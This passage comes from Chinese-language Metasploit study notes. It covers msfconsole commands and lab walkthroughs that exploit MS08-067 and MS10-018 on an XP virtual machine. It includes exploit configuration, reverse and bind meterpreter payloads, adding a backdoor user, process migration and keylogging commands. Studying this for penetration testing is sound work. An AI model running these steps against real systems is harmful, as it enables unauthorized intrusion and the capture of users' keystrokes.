  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2009/MS09-050
  https://nvd.nist.gov/vuln/detail/CVE-2009-3103
  http://www.securityfocus.com/bid/36299
  OSVDB (57799)
  https://seclists.org/fulldisclosure/2009/Sep/0039.html


View the full module info with the info -d command.
</pre>
</div>
</div>
</div>
<div id="outline-container-orgbc79f43" class="outline-4">
<h4 id="orgbc79f43">jobs</h4>
<div class="outline-text-4" id="text-orgbc79f43">
<p>
对工作在后台的进程进行操作。<br>
</p>

<p>
漏洞攻击成功后会创建一个会话连接 session，这些会话默认保存在后台，利用 jobs 切换<br>
</p>
</div>
</div>
<div id="outline-container-org07d64cc" class="outline-4">
<h4 id="org07d64cc">kill</h4>
<div class="outline-text-4" id="text-org07d64cc">
<p>
杀死正在运行的进程.<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">msf exploit(ms10_002_aurora) &gt; kill 0
Stopping job: 0...

[*] Server stopped.
</pre>
</div>
</div>
</div>
<div id="outline-container-org2188be6" class="outline-4">
<h4 id="org2188be6">search</h4>
<div class="outline-text-4" id="text-org2188be6">
<p>
msfconsole包含广泛的基于正则表达式的搜索功能。如果对所要查找的内容有大致了解，可以通过search进行搜索。<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">msf6 &gt; search usermap_script

Matching Modules
================

   <span style="color: #b22222;">#  </span><span style="color: #b22222;">Name                                Disclosure Date  Rank       Check  Description</span>
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba <span style="color: #8b2252;">"username map script"</span> Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script
</pre>
</div>
</div>
</div>
<div id="outline-container-org35f4c7d" class="outline-4">
<h4 id="org35f4c7d">name</h4>
<div class="outline-text-4" id="text-org35f4c7d">
<p>
要使用描述性名称进行搜索，需要使用name关键字。<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">msf6 &gt; search name:mysql

Matching Modules
================

   <span style="color: #b22222;">#   </span><span style="color: #b22222;">Name                                               Disclosure Date  Rank       Check  Description</span>
   -   ----                                               ---------------  ----       -----  -----------
   0   auxiliary/server/capture/mysql                                      normal     No     Authentication Capture: MySQL
   1   auxiliary/scanner/mysql/mysql_writable_dirs                         normal     No     MYSQL Directory Write Test
   2   auxiliary/scanner/mysql/mysql_file_enum                             normal     No     MYSQL File/Directory Enumerator
   3   auxiliary/scanner/mysql/mysql_hashdump                              normal     No     MYSQL Password Hashdump
   4   auxiliary/scanner/mysql/mysql_schemadump                            normal     No     MYSQL Schema Dump
   5   auxiliary/scanner/mysql/mysql_authbypass_hashdump  2012-06-09       normal     No     MySQL Authentication Bypass Password Dump
   6   auxiliary/admin/mysql/mysql_enum                                    normal     No     MySQL Enumeration Module
   7   auxiliary/scanner/mysql/mysql_login                                 normal     No     MySQL Login Utility
   8   auxiliary/admin/mysql/mysql_sql                                     normal     No     MySQL SQL Generic Query
   9   auxiliary/scanner/mysql/mysql_version                               normal     No     MySQL Server Version Enumeration
   10  exploit/linux/mysql/mysql_yassl_getname            2010-01-25       good       No     MySQL yaSSL CertDecoder::GetName Buffer Overflow
   11  exploit/linux/mysql/mysql_yassl_hello              2008-01-04       good       No     MySQL yaSSL SSL Hello Message Buffer Overflow
   12  exploit/windows/mysql/mysql_yassl_hello            2008-01-04       average    No     MySQL yaSSL SSL Hello Message Buffer Overflow
   13  exploit/multi/mysql/mysql_udf_payload              2009-01-16       excellent  No     Oracle MySQL UDF Payload Execution
   14  exploit/windows/mysql/mysql_start_up               2012-12-01       excellent  Yes    Oracle MySQL for Microsoft Windows FILE Privilege Abuse
   15  exploit/windows/mysql/mysql_mof                    2012-12-01       excellent  Yes    Oracle MySQL for Microsoft Windows MOF Execution
   16  exploit/windows/mysql/scrutinizer_upload_exec      2012-07-27       excellent  Yes    Plixer Scrutinizer NetFlow and sFlow Analyzer 9 Default MySQL Credential


Interact with a module by name or index. For example info 16, use 16 or use exploit/windows/mysql/scrutinizer_upload_exec
</pre>
</div>
</div>
</div>
<div id="outline-container-orga21a14c" class="outline-4">
<h4 id="orga21a14c">platform</h4>
<div class="outline-text-4" id="text-orga21a14c">
<p>
可以使用platform将搜索范围缩小到影响特定平台的模块。<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">msf &gt; search platform:aix
</pre>
</div>
</div>
</div>
<div id="outline-container-org649dc1f" class="outline-4">
<h4 id="org649dc1f">type</h4>
<div class="outline-text-4" id="text-org649dc1f">
<p>
使用type可以按模块类型进行过滤，如辅助、发布、利用等。<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">msf &gt; search type:post
</pre>
</div>
</div>
</div>
<div id="outline-container-orgee434c5" class="outline-4">
<h4 id="orgee434c5">author</h4>
<div class="outline-text-4" id="text-orgee434c5">
<p>
使用author关键字搜索，可以按自己喜好的作者搜索模块。<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">msf &gt; search author:dookie
</pre>
</div>
</div>
</div>
<div id="outline-container-org2a60fff" class="outline-4">
<h4 id="org2a60fff">multiple</h4>
<div class="outline-text-4" id="text-org2a60fff">
<p>
还可以将多个关键字组合在一起，以进一步缩小返回结果的范围。<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">msf6 &gt; search cve:2011 author:jduck platform:linux

Matching Modules
================

   <span style="color: #b22222;">#  </span><span style="color: #b22222;">Name                                         Disclosure Date  Rank     Check  Description</span>
   -  ----                                         ---------------  ----     -----  -----------
   0  exploit/linux/misc/netsupport_manager_agent  2011-01-08       average  No     NetSupport Manager Agent Remote Buffer Overflow


Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/misc/netsupport_manager_agent
</pre>
</div>
</div>
</div>
<div id="outline-container-orgcb6936d" class="outline-4">
<h4 id="orgcb6936d">sessions</h4>
<div class="outline-text-4" id="text-orgcb6936d">
<p>
sessions命令允许列出、与衍生会话交互和终止衍生会话。<br>
</p>

<p>
要列出所有活动的会话，使用 -l 选项传递给sessions。<br>
要与给定会话交互，只需使用 -i ，后面跟会话的id号。<br>
</p>
</div>
</div>
<div id="outline-container-org863dd62" class="outline-4">
<h4 id="org863dd62">set</h4>
<div class="outline-text-4" id="text-org863dd62">
<p>
set命令允许为正在使用的当前模块配置框架选项和参数。<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">msf6 &gt; use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) &gt; options

Module options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploi
                                      t/basics/using-metasploit.html
   RPORT   445              yes       The target port (TCP)
   WAIT    180              yes       The number of seconds to wait for the attack to complete.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: <span style="color: #8b2252;">''</span>, seh, thread, process, none)
   LHOST     192.168.1.39     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port






msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) &gt; set RHOST 172.16.194.134
RHOST =&gt; 172.16.194.134
msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) &gt; show options

Module options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  172.16.194.134   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
</pre>
</div>

<p>
Metasploit还允许设置在运行时使用的编码器。当不确定哪些有效负载编码方法将与给定的漏洞一起工作时，就需要进行选择。这在漏洞利用开发中特别有用。<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) &gt;  show encoders

Compatible Encoders
===================

   <span style="color: #b22222;">#   </span><span style="color: #b22222;">Name                                  Disclosure Date  Rank       Check  Description</span>
   -   ----                                  ---------------  ----       -----  -----------
   0   encoder/generic/eicar                                  manual     No     The EICAR Encoder
   1   encoder/generic/none                                   normal     No     The <span style="color: #8b2252;">"none"</span> Encoder
   2   encoder/x86/add_sub                                    manual     No     Add/Sub Encoder
   3   encoder/x86/alpha_mixed                                low        No     Alpha2 Alphanumeric Mixedcase Encoder
   4   encoder/x86/alpha_upper                                low        No     Alpha2 Alphanumeric Uppercase Encoder
   5   encoder/x86/avoid_underscore_tolower                   manual     No     Avoid underscore/tolower
   6   encoder/x86/avoid_utf8_tolower                         manual     No     Avoid UTF8/tolower
   7   encoder/x86/bloxor                                     manual     No     BloXor - A Metamorphic Block Based XOR Encoder
   8   encoder/x86/bmp_polyglot                               manual     No     BMP Polyglot
   9   encoder/x86/call4_dword_xor                            normal     No     Call+4 Dword XOR Encoder
   10  encoder/x86/context_cpuid                              manual     No     CPUID-based Context Keyed Payload Encoder
   11  encoder/x86/context_stat                               manual     No     stat(2)-based Context Keyed Payload Encoder
   12  encoder/x86/context_time                               manual     No     time(2)-based Context Keyed Payload Encoder
   13  encoder/x86/countdown                                  normal     No     Single-byte XOR Countdown Encoder
   14  encoder/x86/fnstenv_mov                                normal     No     Variable-length Fnstenv/mov Dword XOR Encoder
   15  encoder/x86/jmp_call_additive                          normal     No     Jump/Call XOR Additive Feedback Encoder
   16  encoder/x86/nonalpha                                   low        No     Non-Alpha Encoder
   17  encoder/x86/nonupper                                   low        No     Non-Upper Encoder
   18  encoder/x86/opt_sub                                    manual     No     Sub Encoder (optimised)
   19  encoder/x86/service                                    manual     No     Register Service
   20  encoder/x86/shikata_ga_nai                             excellent  No     Polymorphic XOR Additive Feedback Encoder
   21  encoder/x86/single_static_bit                          manual     No     Single Static Bit
   22  encoder/x86/unicode_mixed                              manual     No     Alpha2 Alphanumeric Unicode Mixedcase Encoder
   23  encoder/x86/unicode_upper                              manual     No     Alpha2 Alphanumeric Unicode Uppercase Encoder
   24  encoder/x86/xor_dynamic                                normal     No     Dynamic key XOR Encoder
   25  encoder/x86/xor_poly                                   normal     No     XOR POLY Encoder
</pre>
</div>
</div>
</div>
<div id="outline-container-org213ff84" class="outline-4">
<h4 id="org213ff84">unset</h4>
<div class="outline-text-4" id="text-org213ff84">
<p>
与set命令相反的是unset取消设置，将删除以前使用设置所配置的参数。可以使用unset all删除所有分配的变量。<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">msf6 &gt; set RHOSTS 192.168.1.0/24
RHOSTS =&gt; 192.168.1.0/24
msf6 &gt; set THREADS 50
THREADS =&gt; 50
msf6 &gt; set

Global
======

  Name     Value
  ----     -----
  RHOSTS   192.168.1.0/24
  THREADS  50

msf6 &gt; unset THREADS
Unsetting THREADS...
msf6 &gt; unset all
Unsetting datastore...
msf6 &gt; set

Global
======

No entries<span style="color: #a020f0;"> in</span> data store.

msf6 &gt;
</pre>
</div>
</div>
</div>
<div id="outline-container-org1f44eb5" class="outline-4">
<h4 id="org1f44eb5">setg</h4>
<div class="outline-text-4" id="text-org1f44eb5">
<p>
为了节省渗透期间的大量输入，可以在msfconsole中设置 <b>全局变量</b> 。<br>
</p>

<p>
可以使用setg命令执行此操作。一旦这些设置完成，可以在任意多的漏洞利用和辅助模块中使用它们，还可以保存它们以供下次启动msfconsole时使用。<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">msf6 &gt; setg LHOST 192.168.1.101
LHOST =&gt; 192.168.1.101
msf6 &gt; setg RHOSTS 192.168.1.0/24
RHOSTS =&gt; 192.168.1.0/24
msf6 &gt; setg RHOST 192.168.1.136
RHOST =&gt; 192.168.1.136
</pre>
</div>

<p>
设置不同的变量后，可以运行save命令保存当前环境和设置。保存设置后，它们将在启动时自动加载，从而无需再次设置所有内容。<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">msf6 &gt; save
Saved configuration to: /home/jasper/.msf4/config
</pre>
</div>
</div>
</div>
<div id="outline-container-orgcfeb054" class="outline-4">
<h4 id="orgcfeb054">show</h4>
<div class="outline-text-4" id="text-orgcfeb054">
<p>
在 msfconsole 提示符下输入 show 命令将显示Metasploit中的每个模块，比如常用的命令是show auxiliary、show exploits、show payloads、show encoders。<br>
</p>
</div>
</div>
<div id="outline-container-orgac8417e" class="outline-4">
<h4 id="orgac8417e">auxiliary</h4>
<div class="outline-text-4" id="text-orgac8417e">
<p>
Metasploit的辅助模块，主要用于信息搜集阶段，功能包括扫描、口令猜解、敏感信息嗅探、FUZZ测试发掘漏洞、实施网络协议欺骗等。<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">msf6 &gt; show auxiliary

Auxiliary
=========

   <span style="color: #b22222;">#     </span><span style="color: #b22222;">Name                                                                     Disclosure Date  Rank    Check  Description</span>
   -     ----                                                                     ---------------  ----    -----  -----------
   0     auxiliary/admin/2wire/xslt_password_reset                                2007-08-15       normal  No     2Wire Cross-Site Request Forgery Password Reset Vulnerability
   1     auxiliary/admin/android/google_play_store_uxss_xframe_rce                                 normal  No     Android Browser RCE Through Google Play Store XFO

... ...
</pre>
</div>
</div>
</div>
<div id="outline-container-org0304bfc" class="outline-4">
<h4 id="org0304bfc">exploits</h4>
<div class="outline-text-4" id="text-org0304bfc">
<p>
show exploits是我们最感兴趣的模块，因为Metasploit的核心是利用漏洞。运行show exploits以获取 MSF 框架中包含的所有漏洞的列表。<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">msf &gt; show exploits
</pre>
</div>
</div>
</div>
<div id="outline-container-orgdf07a76" class="outline-4">
<h4 id="orgdf07a76">payloads</h4>
<div class="outline-text-4" id="text-orgdf07a76">
<p>
运行show payloads将显示Metasploit中所有可用平台的所有不同有效载荷。<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">msf &gt; show payloads
</pre>
</div>

<p>
当处于某个特定漏洞利用模块下时，运行show payloads将只显示与该特定漏洞利用模块兼容的有效负载。例如，如果它是一个Windows漏洞，将不会看到Linux有效负载。<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">msf6 &gt; use exploit/windows/smb/ms08_067_netapi
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms08_067_netapi) &gt; show payloads
</pre>
</div>
</div>
</div>
<div id="outline-container-org86a2f15" class="outline-4">
<h4 id="org86a2f15">options</h4>
<div class="outline-text-4" id="text-org86a2f15">
<p>
如果选择了特定模块，则可以发出show options命令，显示该特定模块下必要&amp;可选的设置项。<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">msf6 &gt; use exploit/windows/smb/ms08_067_netapi

msf6 exploit(windows/smb/ms08_067_netapi) &gt; show options

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasplo
                                       it/basics/using-metasploit.html
   RPORT    445              yes       The SMB service port (TCP)

&#21442;&#25968;&#21517;  &#24403;&#21069;&#35774;&#32622;  &#26159;&#21542;&#24517;&#39035;  &#25551;&#36848;
</pre>
</div>
</div>
</div>
<div id="outline-container-org2f8be9b" class="outline-4">
<h4 id="org2f8be9b">targets</h4>
<div class="outline-text-4" id="text-org2f8be9b">
<p>
如果不确定操作系统是否易受特定攻击，在攻击模块的上下文中运行show targets命令，查看支持哪些目标。<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">msf6 exploit(windows/smb/ms08_067_netapi) &gt; show targets

Exploit targets:
=================

    Id  Name
    --  ----
=&gt;  0   Automatic Targeting
    1   Windows 2000 Universal
    2   Windows XP SP0/SP1 Universal
    3   Windows 2003 SP0 Universal
    4   Windows XP SP2 English (AlwaysOn N
</pre>
</div>
</div>
</div>
<div id="outline-container-org15434fa" class="outline-4">
<h4 id="org15434fa">advanced</h4>
<div class="outline-text-4" id="text-org15434fa">
<p>
如果希望进一步微调漏洞，可以通过运行show advanced查看更多高级选项。<br>
</p>

<p>
用的不多<br>
设置一些扫描速度、带宽<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">msf exploit(ms08_067_netapi) &gt; show advanced
</pre>
</div>
</div>
</div>
<div id="outline-container-orgdfe50ff" class="outline-4">
<h4 id="orgdfe50ff">encoders</h4>
<div class="outline-text-4" id="text-orgdfe50ff">
<p>
运行show encoders将显示MSF中可用的编码器列表。<br>
</p>

<p>
解决乱码问题、对攻击流量做加密<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show encoders

Compatible Encoders
===================

   <span style="color: #b22222;">#  </span><span style="color: #b22222;">Name                      Disclosure Date  Rank    Check  Description</span>
   -  ----                      ---------------  ----    -----  -----------
   0  encoder/generic/eicar                      manual  No     The EICAR Encoder
   1  encoder/generic/none                       normal  No     The <span style="color: #8b2252;">"none"</span> Encoder
   2  encoder/x64/xor                            normal  No     XOR Encoder
   3  encoder/x64/xor_dynamic                    normal  No     Dynamic key XOR Encoder
   4  encoder/x64/zutto_dekiru                   manual  No     Zutto Dekiru
</pre>
</div>
</div>
</div>
<div id="outline-container-org480e1b0" class="outline-4">
<h4 id="org480e1b0">use</h4>
<div class="outline-text-4" id="text-org480e1b0">
<p>
当决定使用某个特定模块时，使用use命令来选择它。use命令将上下文更改为特定模块。<br>
或者在 search 查找漏洞模块后，使用 use 编号使用这个模块<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">msf &gt; use dos/windows/smb/ms09_001_write
msf auxiliary(ms09_001_write) &gt; show options
</pre>
</div>
</div>
</div>
<div id="outline-container-org682dae9" class="outline-4">
<h4 id="org682dae9">meterpreter 内命令</h4>
<div class="outline-text-4" id="text-org682dae9">
<p>
攻击成功后的命令操作<br>
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#25915;&#20987;&#25104;&#21151;&#21518;&#36827;&#34892; meterpreter &#25191;&#34892;&#25915;&#20987;&#21629;&#20196;</span>
meterpreter &gt; help &#24110;&#21161;
getuid &#29992;&#25143;
screenshot &#25130;&#23631;
getpid &#36827;&#31243;&#21495;
<span style="color: #483d8b;">pwd</span> &#36335;&#24452;
sysinfo &#31995;&#32479;&#20449;&#24687;
&#24405;&#23631;
&#20851;&#26426;

backgroud &#23558;&#20250;&#35805;&#25918;&#20837;&#21518;&#21488;
sessions &#26597;&#30475;&#20250;&#35805;
sessions -i [Id] &#36827;&#20837;&#20250;&#35805;
run post/windows/gather/enum_patches &#26597;&#30475;&#34917;&#19969;&#20449;&#24687;
run post/multi/recon/local_exploit_suggester &#26597;&#35810;&#21738;&#20123;&#25552;&#26435;exp&#21487;&#20197;&#29992;&#65292;&#27604;&#36739;&#24930;&#65292;&#22833;&#36133;&#20102;&#23601;&#20877;&#26469;&#19968;&#27425;
shell &#36827;&#20837;&#30446;&#26631;&#32456;&#31471;

</pre>
</div>
</div>
</div>
</div>
</section>
<section id="outline-container-orga64a8af" class="outline-2">
<h2 id="orga64a8af">MSF 漏洞利用</h2>
<div class="outline-text-2" id="text-orga64a8af">
<p>
内容安全：<br>
</p>
<ul class="org-ul">
<li>MS08-067 漏洞攻防还原<br></li>
<li>MS10-018 漏洞攻防还原<br></li>
<li>MS17-010 漏洞与勒索病毒的深度解析<br></li>
<li>MS17-010 漏洞攻防还原<br></li>
<li>MSF 之 samba 服务漏洞攻防还原<br></li>
<li>Bash Shellshock CVE-2014-6271(破壳)与 PHP CGI 漏洞还原<br></li>
<li>MSF 之 CVE-2017-8464 震网三代、CVE-2018-4878 漏洞攻防还原与辅助模块<br></li>
<li>MSF 之后续权限提升<br></li>
</ul>

<p>
渗透测试：web漏洞，在前端<br>
</p>

<p>
范围：web标准(html、JS)，数量级是100左右<br>
</p>

<p>
主机层：主机漏洞，在后端<br>
</p>

<p>
取决于部署了什么操作系统(windows、linux、mac、unix)，中间件、数据库、网络协议、应用程序，主机漏洞数量级是几十万，覆盖面非常广<br>
</p>
</div>
<div id="outline-container-org4e832f9" class="outline-3">
<h3 id="org4e832f9">MS08-067漏洞</h3>
<div class="outline-text-3" id="text-org4e832f9">
<p>
MS08-067漏洞会影响Windows 2000/XP/Server 2003/Vista/Server 2008的各个版本，甚至还包括测试阶段的Windows 7 Pro-Beta。<br>
</p>

<p>
如果用户在受影响的系统上收到特制的 RPC 请求，则可能导致攻击者在未经身份验证的情况下利用此漏洞运行任意代码，实现远程代码执行。现阶段，已经可以通过防火墙来阻断该漏洞的攻击。<br>
</p>
</div>
<div id="outline-container-org8a7fa78" class="outline-4">
<h4 id="org8a7fa78">漏洞利用</h4>
<div class="outline-text-4" id="text-org8a7fa78">
<p>
受攻击方：关闭主机防火墙。找到控制面板设置防火墙<br>
</p>

<p>
攻击方：<br>
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#36755;&#20837;msfconsole&#36827;&#20837;msf&#32456;&#31471;</span>
msfconsole

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#26597;&#25214;ms08-067&#28431;&#27934;&#21033;&#29992;&#27169;&#22359;</span>
search ms08-067

msf6 &gt; search ms08-067

Matching Modules
================

   <span style="color: #b22222;">#  </span><span style="color: #b22222;">Name                                 Disclosure Date  Rank   Check  Description</span>
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#20351;&#29992;&#26597;&#25214;&#20986;&#26469;&#30340;&#25915;&#20987;&#27169;&#22359;</span>
use exploit/windows/smb/ms08_067_netapi
&#25110;&#32773;use 0

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#26597;&#30475;&#35813;&#25915;&#20987;&#27169;&#22359;&#19979;&#25152;&#38656;&#30340;&#37197;&#32622;&#20449;&#24687;</span>
show options &#25110;&#32773; options

msf6 exploit(windows/smb/ms08_067_netapi) &gt; options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit
                                       /basics/using-metasploit.html
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: <span style="color: #8b2252;">''</span>, seh, thread, process, none)
   LHOST     10.151.32.60     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting  &#33258;&#21160;&#26816;&#27979;&#25805;&#20316;&#31995;&#32479;&#29256;&#26412;

<span style="color: #b22222;"># </span><span style="color: #b22222;">rhost &#28431;&#27934;&#20027;&#26426;&#22320;&#22336;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">lhost &#30417;&#25511;&#22320;&#22336;&#65292;&#21363;&#28304;&#21407;&#22320;&#22336;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">Payload options (windows/meterpreter/reverse_tcp): &#40664;&#35748;&#30340;payload</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">reverse_x &#21453;&#24377;shell&#65292;&#30001;&#20869;&#21521;&#22806;&#24314;&#31435;&#36830;&#25509;&#36890;&#36947;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">bind_x &#20027;&#21160;&#27169;&#22359;&#65292;&#20027;&#21160;&#25171;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35774;&#32622;&#38774;&#26426;&#22320;&#22336;</span>
<span style="color: #483d8b;">set</span> RHOSTS your_ip

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#26597;&#30475;targets</span>
show targets

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#36873;&#25321;&#25915;&#20987;&#30446;&#26631;&#65288;&#36825;&#37324;&#25105;&#20204;&#25915;&#20987; ip &#23545;&#24212;&#30340;xp&#31995;&#32479;&#65289;</span>
<span style="color: #483d8b;">set</span> tartget 34

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#20877;&#27425;&#26816;&#26597;&#37197;&#32622;&#20449;&#24687;</span>
show options

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#26597;&#30475;&#26377;&#21738;&#20123; pyload &#21487;&#21033;&#29992;</span>
show payloads

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35774;&#32622;&#25915;&#20987;payload</span>
<span style="color: #483d8b;">set</span> payload windows/meterpreter/bind_tcp

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#25191;&#34892;exploit&#25915;&#20987;</span>
exploit
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#25915;&#20987;&#25104;&#21151;&#21518;&#36827;&#34892; meterpreter &#25191;&#34892;&#25915;&#20987;&#21629;&#20196;</span>
meterpreter &gt; getuid &#29992;&#25143;
screenshot &#25130;&#23631;
getpid &#36827;&#31243;&#21495;
<span style="color: #483d8b;">pwd</span> &#36335;&#24452;
sysinfo &#31995;&#32479;&#20449;&#24687;
&#24405;&#23631;
&#20851;&#26426;
&#31561;
</pre>
</div>


<figure id="org52254d4">
<img src="./images/img_20230726_161235.png" alt="img_20230726_161235.png" width="60%"><br>

</figure>


<p>
进入Windows Shell<br>
shell<br>
</p>



<figure id="org254969f">
<img src="./images/img_20230726_161256.png" alt="img_20230726_161256.png" width="60%"><br>

</figure>

<p>
net user <i>/ 查看用户<br>
net user xxx3 123 /add //添加用户 密码123<br>
net user /</i> 查看用户<br>
netstat -ano // 进程信息<br>
</p>
</div>
</div>
<div id="outline-container-orgcbbac8a" class="outline-4">
<h4 id="orgcbbac8a">使用键盘记录</h4>
<div class="outline-text-4" id="text-orgcbbac8a">
<p>
meterpreter 中<br>
使用 ps 查看进程<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">ps
migrate 1392 <span style="color: #8b2252;">\\</span>&#20351;&#29992;ps&#25214;&#21040;&#21512;&#36866;&#30340;&#36827;&#31243;&#65288;&#22914;&#35760;&#20107;&#26412;&#36827;&#31243;&#65289;&#36827;&#34892;&#36801;&#31227;&#65292;&#36801;&#31227;&#21040;&#26377;&#31649;&#29702;&#21592;&#26435;&#38480;&#30340;&#36827;&#31243;
</pre>
</div>

<p>
使用 keyscan_start 开启键盘记录；<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">meterpreter &gt; keyscan_start
Starting the keystroke sniffer ...
</pre>
</div>

<p>
在XP系统中任意输入字符，使用 keyscan_dump 进行查看（ keyscan_stop 关闭键盘记录）<br>
</p>
</div>
</div>
</div>
<div id="outline-container-org03364ca" class="outline-3">
<h3 id="org03364ca">MS10-018漏洞</h3>
<div class="outline-text-3" id="text-org03364ca">
</div>
<div id="outline-container-org6286d6c" class="outline-4">
<h4 id="org6286d6c">漏洞简介</h4>
<div class="outline-text-4" id="text-org6286d6c">
<p>
MS10-018是IE浏览器上的漏洞，主要危害Internet Explorer 6~7，攻击者可以通过该漏洞获取受害主机的控制权。<a href="https://learn.microsoft.com/zh-cn/security-updates/securitybulletins/2010/ms10-018">详细信息</a><br>
</p>
</div>
</div>
<div id="outline-container-orge62c95c" class="outline-4">
<h4 id="orge62c95c">漏洞利用</h4>
<div class="outline-text-4" id="text-orge62c95c">
<p>
开启防火墙<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">msfconsole
search ms10_018
use exploit/windows/browser/ms10_018_ie_behaviors

options //&#26597;&#30475;&#37197;&#32622;
<span style="color: #b22222;"># </span><span style="color: #b22222;">srvhost &#34920;&#31034;&#21453;&#24377;&#22320;</span>

<span style="color: #483d8b;">set</span> srvhost 192.168.0.110 //&#35774;&#32622;web&#26381;&#21153;ip&#65292;&#36825;&#37324;&#26159;Kali&#30340;&#22320;&#22336;
<span style="color: #483d8b;">set</span> uripath xxx //&#35774;&#32622;uri&#36335;&#24452;
options //&#26597;&#30475;&#37197;&#32622;

exploit //&#25915;&#20987;
</pre>
</div>

<p>
xp机器中浏览器访问对应的URL <a href="http://192.168.0.110:8080/xxx">http://192.168.0.110:8080/xxx</a> ；访问之后会闪退<br>
</p>

<p>
msf会接收到session<br>
</p>

<p>
查看session<br>
sessions -l<br>
</p>

<p>
使用session<br>
sessions -i 3  // 3 为对应id，进入 meterpreter<br>
</p>

<p>
由被攻击机器向攻击机器建立的通道，所以开启防火墙也没用。<br>
</p>

<p>
思考：如何利用该漏洞？<br>
</p>
</div>
</div>
</div>
<div id="outline-container-orga27d8d4" class="outline-3">
<h3 id="orga27d8d4">MS17-010漏洞</h3>
<div class="outline-text-3" id="text-orga27d8d4">
</div>
<div id="outline-container-orgc42432b" class="outline-4">
<h4 id="orgc42432b">漏洞简介</h4>
<div class="outline-text-4" id="text-orgc42432b">
<p>
永恒之蓝漏洞（MS17-010），它的爆发源于 WannaCry 勒索病毒的诞生，该病毒是不法分子利用NSA（National Security Agency，美国国家安全局）泄露的漏洞 “EternalBlue”（永恒之蓝）进行改造而成。该漏洞可以通过TCP的139和445端口，攻击Windows系统的SMB服务，造成远程代码执行。<br>
</p>

<p>
MS17-010漏洞主要是针对于Windows7及以前的操作系统。<br>
</p>

<p>
勒索病毒文章：<a href="https://www.h3c.com/cn/d_202307/1895269_473262_0.htm">https://www.h3c.com/cn/d_202307/1895269_473262_0.htm</a><br>
</p>
</div>
</div>
<div id="outline-container-orga8f89d7" class="outline-4">
<h4 id="orga8f89d7">漏洞利用</h4>
<div class="outline-text-4" id="text-orga8f89d7">
<p>
Win7系统中的MS17-010利用条件：<br>
</p>
<ul class="org-ul">
